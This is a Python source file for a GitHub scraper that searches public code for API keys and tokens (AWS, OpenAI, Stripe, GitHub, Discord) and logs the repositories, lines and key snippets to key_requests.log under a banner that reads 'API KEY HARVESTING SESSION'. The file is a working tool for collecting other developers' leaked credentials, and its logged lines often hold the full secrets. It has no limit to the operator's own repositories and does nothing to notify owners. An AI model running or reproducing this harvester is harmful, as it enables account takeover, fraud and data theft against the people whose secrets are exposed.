import time
import logging
import json
from datetime import datetime
from github import Github, GithubException
from github.GithubException import RateLimitExceededException
import base64
import os
from pathlib import Path

logger = logging.getLogger(__name__)

# Setup key requests logger
key_logger = logging.getLogger('key_requests')
key_logger.setLevel(logging.INFO)

# Create file handler for key requests
key_log_handler = logging.FileHandler('key_requests.log')
key_log_handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S'))
key_logger.addHandler(key_log_handler)

class GitHubScraper:
    def __init__(self, config):
        self.config = config
        self.gh = None
        self.rate_limit_remaining = 0
        self.rate_limit_reset = 0
        self.init_github()
        
    def init_github(self):
        """Initialize GitHub connection with token if available"""
        token = self.config.get('github_token')
        if token:
            self.gh = Github(token)
            logger.info("GitHub scraper initialized with token")
            # Log rate limit info
            try:
                rate = self.gh.get_rate_limit()
                logger.info(f"Rate limit: {rate.core.remaining}/{rate.core.limit} requests remaining")
            except:
                pass
        else:
            # Use anonymous access (strictly rate limited)
            self.gh = Github()
            logger.warning("GitHub scraper initialized without token - rate limit will be very low")
    
    def _check_rate_limit(self):
        """Check rate limit and wait if necessary"""
        try:
            rate = self.gh.get_rate_limit()
            self.rate_limit_remaining = rate.core.remaining
            self.rate_limit_reset = rate.core.reset.timestamp()
            
            if self.rate_limit_remaining < 10:
                wait_time = max(self.rate_limit_reset - time.time(), 0) + 5
                logger.warning(f"Rate limit low ({self.rate_limit_remaining}), waiting {wait_time:.0f}s")
                time.sleep(min(wait_time, 60))  # Don't wait more than 60 seconds
                return False
            return True
        except Exception as e:
            logger.error(f"Error checking rate limit: {e}")
            time.sleep(5)
            return False
    
    def _safe_decode(self, content_file):
        """Safely decode content file"""
        try:
            # Try to get content directly
            if hasattr(content_file, 'content') and content_file.content:
                return base64.b64decode(content_file.content).decode('utf-8', errors='ignore')
            elif hasattr(content_file, 'decoded_content'):
                return content_file.decoded_content.decode('utf-8', errors='ignore')
        except Exception as e:
            logger.debug(f"Decode error: {e}")
        return ""
    
    def _extract_api_keys(self, content, repo_name, file_url):
        """Extract potential API keys from content"""
        found_keys = []
        lines = content.split('\n')
        
        # Common API key patterns
        key_patterns = [
            'api[_-]?key',
            'apikey',
            'secret[_-]?key',
            'aws[_-]?secret',
            'openai[_-]?api',
            'stripe[_-]?secret',
            'github[_-]?token',
            'discord[_-]?token',
            'token[_-]?=[\'"]',
            'key[_-]?=[\'"]'
        ]
        
        for i, line in enumerate(lines[:50]):  # Check first 50 lines
            line_lower = line.lower()
            for pattern in key_patterns:
                if pattern in line_lower:
                    # Try to extract the actual key value
                    import re
                    key_match = re.search(r'[\'"]([A-Za-z0-9_\-]{20,})[\'"]', line)
                    if key_match:
                        key_value = key_match.group(1)
                        found_keys.append({
                            'line': i + 1,
                            'pattern': pattern,
                            'key': key_value[:20] + '...' if len(key_value) > 20 else key_value,
                            'full_line': line.strip()[:100]
                        })
                    else:
                        found_keys.append({
                            'line': i + 1,
                            'pattern': pattern,
                            'key': 'unknown',
                            'full_line': line.strip()[:100]
                        })
                    break
        
        return found_keys
    
    def _search_with_query(self, query):
        """Perform search with given query"""
        try:
            if not self._check_rate_limit():
                return 0
            
            result_count = 0
            search_result = self.gh.search_code(query)
            
            logger.info(f"Searching GitHub for: {query} (total: {search_result.totalCount})")
            
            for result in search_result[:min(50, search_result.totalCount)]:  # Limit to 50 results
                try:
                    # Get content safely
                    content = self._safe_decode(result)
                    
                    # Look for API keys in content
                    if content and ('api_key' in content.lower() or 'apikey' in content.lower() or 
                                   'api-key' in content.lower() or 'secret' in content.lower() or
                                   'token' in content.lower()):
                        
                        # Extract potential keys
                        found_keys = self._extract_api_keys(content, result.repository.full_name, result.html_url)
                        
                        if found_keys:
                            # Log to key_requests.log
                            key_logger.info(f"🔑 Found potential API key in {result.repository.full_name}")
                            key_logger.info(f"   URL: {result.html_url}")
                            for key_info in found_keys:
                                key_logger.info(f"   Line {key_info['line']}: {key_info['full_line']}")
                                if key_info['key'] != 'unknown':
                                    key_logger.info(f"   Key snippet: {key_info['key']}")
                            key_logger.info(f"   ---")
                            
                            # Also log to main logger
                            logger.info(f"🔑 Found potential API key in {result.repository.full_name}")
                            result_count += 1
                    
                    # Small delay to avoid hitting rate limits
                    time.sleep(0.5)
                    
                except RateLimitExceededException:
                    logger.warning("Rate limit exceeded, waiting...")
                    time.sleep(60)
                    continue
                except Exception as e:
                    logger.debug(f"Error processing result: {e}")
                    continue
            
            return result_count
            
        except RateLimitExceededException:
            logger.warning("Rate limit exceeded in search")
            time.sleep(60)
            return 0
        except Exception as e:
            logger.error(f"Search error: {e}")
            return 0
    
    def search_code(self):
        """Main search method"""
        total_found = 0
        
        # Log session start
        key_logger.info("=" * 60)
        key_logger.info(f"🔍 GITHUB API KEY HARVESTING SESSION STARTED - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        key_logger.info("=" * 60)
        
        # Search queries for different types of API keys
        queries = [
            'api.key',
            'api_key',
            'apikey',
            'secret.key',
            'aws.secret',
            'openai.api',
            'stripe.secret',
            'github.token',
            'discord.token'
        ]
        
        for query in queries:
            logger.info(f"🔍 Searching GitHub for: {query}")
            key_logger.info(f"\n📋 Query: {query}")
            found = self._search_with_query(query)
            total_found += found
            logger.info(f"Found {found} potential keys for query '{query}'")
            key_logger.info(f"📊 Found {found} potential keys for query '{query}'")
            
            # Delay between queries
            time.sleep(2)
        
        # Log session end
        key_logger.info("=" * 60)
        key_logger.info(f"✅ SESSION COMPLETE - Total keys found: {total_found}")
        key_logger.info("=" * 60)
        
        return total_found
